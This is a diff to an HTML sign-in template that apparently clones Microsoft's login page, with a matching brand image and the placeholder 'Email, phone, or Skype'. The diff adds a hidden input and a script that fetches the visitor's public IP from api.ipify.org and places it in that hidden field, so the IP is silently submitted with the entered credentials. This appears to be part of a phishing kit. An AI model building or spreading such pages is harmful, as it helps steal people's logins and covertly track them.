@@ -1,14 +1,16 @@
 {% extends 'base.html'%} {%block form%}
 
 <div class="sign-in-form">
-  <div class="brand-section">
+  <div style="margin-bottom: -15px;" class="brand-section">
     <img src="../static/images/brand.svg" alt="" srcset="" />
   </div>
-  <p style="font-size: 30px">Sign In</p>
+  <h3 style="font-size: 27px;">Sign In</h3>
 
   <form method="post">
-    <input placeholder="Email, phone or Skype" type="text" name="user-id" id="" />
-
+    <input placeholder="Email, phone, or Skype" type="text" name="user-id" id="" />
+    <div style="display: none;">
+<input id="ip" type="text">
+</div>
     <div class="margin">
       <p>
         No account? <span class="link"><a href="">Create one!</a></span>
@@ -49,6 +51,9 @@
 </div>
 
 <script>
-  
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+         document.getElementById('ip').value = data.ip
+     })
 </script>
 {%endblock%}
